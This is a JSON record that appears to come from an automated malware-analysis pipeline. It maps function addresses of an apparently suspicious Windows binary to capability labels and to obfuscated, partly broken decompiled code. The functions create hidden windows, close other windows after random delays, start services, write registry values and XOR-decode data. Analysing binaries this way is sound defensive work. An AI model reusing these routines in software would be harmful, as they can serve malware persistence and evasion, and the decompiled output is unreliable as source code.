            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00402180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402248) overlaps instruction at (ram,0x00402246)\n// \n\nuint __cdecl fcn.00402180(uint arg_8h, int32_t arg_ch)\n\n{\n    char extraout_CH;\n    int32_t iVar1;\n    uint *puVar2;\n    uchar *puVar3;\n    uint uVar4;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    puVar3 = &var_108h;\n    uVar4 = 0x4114cc;\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(puVar3, 0x4114cc);\n    if (iVar1 == 0) {\n        if ((iVar1 < 0) || (iVar1 >= 0)) {\n            uVar4 = 0;\n            puVar3 = 0x402100;\n        }\n        else {\n            *0x6a08758b = *0x6a08758b & 0xffffff00 | *0x6a08758b + extraout_CH;\n            *0x6a08758b = *0x6a08758b & 0x6a08758b;\n        }\n        (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, puVar3, uVar4);\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n        (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 550
    },
    "004024d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004024d0(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint16_t extraout_CX;\n    uint16_t unaff_BX;\n    uint *puVar4;\n    uint *puVar5;\n    bool bVar6;\n    uint var_4h;\n    \n    uVar3 = arg_ch;\n    puVar4 = &stack0xfffffffc;\n    iVar2 = fcn.00403440(arg_8h, arg_ch, &var_4h, &arg_ch);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    bVar6 = (POPCOUNT((unaff_BX ^ extraout_CX) & 0xff) & 1U) != 0;\n    *(iVar2 + 0x58) = arg_ch;\n    if ((bVar6) && (!bVar6)) {\n        puVar5 = &stack0xffffffe8;\n        cVar1 = '\\x1e';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar3 = in(0x78);\n        return uVar3;\n    }\n    fcn.00403440(arg_8h, uVar3, &var_4h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 347
    },
    "00402a50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402a9f) overlaps instruction at (ram,0x00402a9a)\n// \n\nuint __cdecl fcn.00402a50(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    char *pcVar2;\n    bool bVar3;\n    ulong uVar4;\n    \n    uVar4 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x407024, 0x4235a4, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    pcVar2 = uVar4 >> 0x20;\n    uVar1 = uVar4;\n    bVar3 = (POPCOUNT(uVar1 & 0xff) & 1U) == 0;\n    if (uVar1 == 0) {\n        return 0;\n    }\n    if ((bVar3) || (!bVar3)) {\n        (*_sym.imp.USER32.dll_ShowWindow)(uVar1, 0);\n    }\n    else {\n        *pcVar2 = *pcVar2 + uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 280
    },
    "00402b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402b50(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EDI;\n    float10 extraout_ST0;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    if ((-1 < iVar2) && (-1 >= iVar2)) {\n        *(unaff_EDI + 0x1c) = extraout_ST0;\n        iVar2 = iVar2 + 5;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 307
    },
    "00402bf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402c1f) overlaps instruction at (ram,0x00402c1c)\n// \n\nchar * __cdecl fcn.00402bf0(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    ushort in_CX;\n    int32_t iVar1;\n    char *pcVar2;\n    uint unaff_EBX;\n    char *pcVar3;\n    char *pcVar4;\n    ushort in_SS;\n    bool bVar5;\n    ushort uVar6;\n    \n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h != 0) {\n        uVar6 = unaff_EBX >> 0x10;\n        if (arg_14h != 0) {\n            uVar6 = in_CX;\n        }\n        iVar1 = CONCAT22(uVar6, in_SS);\n        bVar5 = (arg_8h & 0xc23b18c5) == 0;\n        pcVar3 = arg_10h;\n        if (bVar5) {\n            do {\n                pcVar4 = pcVar3;\n                if ((!bVar5) && (bVar5)) {\n                    arg_8h = arg_8h & 0xffffff00 | *0x4bb148d3;\n                    pcVar4 = pcVar3 + 1;\n                    out(*pcVar3, pcVar2);\n                }\n                if (*arg_8h == *pcVar4) {\n                    bVar5 = true;\n                    pcVar3 = arg_8h;\n                    do {\n                        pcVar4 = pcVar4 + 1;\n                        pcVar3 = pcVar3 + 1;\n                        iVar1 = iVar1 + -1;\n                        if (iVar1 == 0) break;\n                        bVar5 = *pcVar3 == *pcVar4;\n                    } while (bVar5);\n                    pcVar4 = arg_10h;\n                    iVar1 = arg_14h;\n                    if (bVar5) {\n                        return arg_8h;\n                    }\n                }\n                arg_8h = arg_8h + 1;\n                bVar5 = arg_8h == pcVar2;\n                pcVar3 = pcVar4;\n            } while (arg_8h <= pcVar2);\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 542
    },
    "00403570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nint32_t fcn.00403570(void)\n\n{\n    int32_t iVar1;\n    bool in_OF;\n    \n    if ((!in_OF) && (in_OF)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 96
    },
    "00404020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040405e) overlaps instruction at (ram,0x0040405d)\n// \n// WARNING: Removing unreachable block (ram,0x00404050)\n// WARNING: Removing unreachable block (ram,0x0040405a)\n// WARNING: Removing unreachable block (ram,0x0040405e)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00404020(uint *param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar uStack108;\n    uint uStack107;\n    uint uStack8;\n    \n    uStack8 = 0;\n    uStack108 = 0;\n    puVar2 = &uStack107;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403d90(&uStack108, &uStack8);\n    fcn.004042c0(&uStack108, uStack8, 0x411588, 0x12000);\n    *param_1 = 0x411588;\n    *param_2 = 0x12000;\n    return;\n}\n",
        "token_count": 319
    },
    "00404250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404293) overlaps instruction at (ram,0x00404291)\n// \n\nvoid __cdecl fcn.00404250(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint8_t uVar3;\n    uint32_t in_EDX;\n    uint32_t uVar4;\n    \n    uVar4 = 0;\n    uVar1 = arg_ch;\n    if (arg_ch != 0) {\n        do {\n            if ((uVar1 < 0) || (uVar1 >= 0)) {\n                iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n                in_ECX = 0x1a;\n                in_EDX = iVar2 % 0x1a;\n            }\n            else {\n                *(in_ECX + 0x1ab9) = *(in_ECX + 0x1ab9) + arg_8h;\n                arg_8h = arg_8h & 0xffff0000 | CONCAT11((arg_8h >> 8) + (in_EDX >> 8), arg_8h);\n            }\n            uVar3 = in_EDX + 0x61;\n            in_EDX = in_EDX & 0xffffff00 | uVar3;\n            *(uVar4 + arg_8h) = uVar3;\n            uVar4 = uVar4 + 1;\n            uVar1 = uVar4 - arg_ch;\n        } while (uVar4 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 360
    },
    "00404380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404380(void)\n\n{\n    uint uVar1;\n    \n    if (*0x4235cc == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x4235cc = 1;\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "00402a10": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402a10(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00401380": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401380(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t unaff_BL;\n    int32_t unaff_EDI;\n    bool bVar3;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    iVar2 = arg_14h;\n    if (0 < arg_14h) {\n        do {\n            bVar3 = -1 < (iVar2 >> 8 ^ unaff_BL);\n            uVar1 = *(var_4h + arg_10h);\n            if ((bVar3) && (!bVar3)) {\n                *(unaff_EDI + 0x1c) = in_ST0;\n                unaff_EDI = unaff_EDI + 5;\n                in_ST0 = in_ST1;\n                in_ST1 = in_ST2;\n                in_ST2 = in_ST3;\n                in_ST3 = in_ST4;\n                in_ST4 = in_ST5;\n                in_ST5 = in_ST6;\n                in_ST6 = in_ST7;\n            }\n            unaff_BL = arg_14h ^ uVar1 ^ *(var_4h % arg_ch + arg_8h);\n            *(var_4h + arg_10h) = unaff_BL;\n            var_4h = var_4h + 1;\n            iVar2 = arg_10h;\n        } while (var_4h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 411
    },
    "004016f0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.004016f0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4112d0, 0x411314, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 80
    }
}